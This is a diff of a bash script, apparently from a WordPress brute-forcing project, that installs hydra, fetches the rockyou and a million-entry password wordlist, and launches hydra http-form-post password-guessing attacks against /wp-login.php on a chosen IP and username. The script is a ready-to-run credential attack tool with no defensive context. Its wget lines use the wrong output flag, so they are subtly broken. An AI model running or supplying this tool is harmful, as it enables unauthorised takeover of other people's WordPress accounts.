@@ -9,23 +9,26 @@ GREEN='\u001b[32m'
 NC='\033[0m' # No Color
 
 # install required packages
-echo -e "downloading required packages..."
+echo -e "$GREEN""downloading required packages...""$NC"
 sudo apt install hydra
 
-# download and unpack wordlists
-echo -e "$GREEN""moving wordlists""$NC"
-cp -n /mnt/c/Users/Sephley/Documents/GitHub/Hydra/Hydra/wordlists/rockyou.txt.gz ~
-cp -n /mnt/c/Users/Sephley/Documents/GitHub/Hydra/Hydra/wordlists/1milpwlist.txt ~
-
 # create directories
-mkdir ~/pwbruteforcer
-mkdir ~/pwbruteforcer/wordlists
-mv ~/rockyou.txt.gz ~/pwbruteforcer/wordlists
-mv ~/1milpwlist.txt ~/pwbruteforcer/wordlists
+mkdir ~/wpbruteforcer
+mkdir ~/wpbruteforcer/wordlists
+
+# download wordlists
+echo -e "$GREEN""moving wordlists""$NC"
+wget -q https://github.com/Sephley/WPbruteforcer/raw/main/wordlists/rockyou.txt.gz -o ~/wpbruteforcer/wordlists
+wget -q https://github.com/Sephley/WPbruteforcer/raw/main/wordlists/1milpwlist.txt -o ~/wpbruteforcer/wordlists
 
 # de-compress rockyou.txt
 echo -e "$GREEN""de-compressing wordlists""$NC"
-gzip -d ~/pwbruteforcer/wordlists/rockyou.txt.gz
+gzip -d ~/wpbruteforcer/wordlists/rockyou.txt.gz
+
+echo -e "$GREEN""would you like to use a username wordlist, or would you like to try a specific one?\n""$NC"
+select w in 'I want to use a wordlist' 'I want to try a specific username'; 
+do test -n "$w" && break; 
+echo -e "$RED>>> Invalid Selection""$NC"; done
 
 echo -e "$GREEN""enter username: ""$NC"
 read -r USERNAME
@@ -44,9 +47,9 @@ echo -e "$RED>>> Invalid Selection""$NC"; done
 
 if [ "$REPLY" == 1 ]; then 
     echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
-    hydra -l "$USERNAME" -P ~/pwbruteforcer/wordlists/$ROCKYOU "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
+    hydra -l "$USERNAME" -P ~/wpbruteforcer/wordlists/$ROCKYOU "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
 else echo -e "$GREEN""you picked the following wordlist: 1milpwlist.txt""$NC"
-    hydra -l "$USERNAME" -P ~/pwbruteforcer/wordlists/$ONEMILPWLIST "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
+    hydra -l "$USERNAME" -P ~/wpbruteforcer/wordlists/$ONEMILPWLIST "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
 fi
 
 # use pw-inspector to filter?
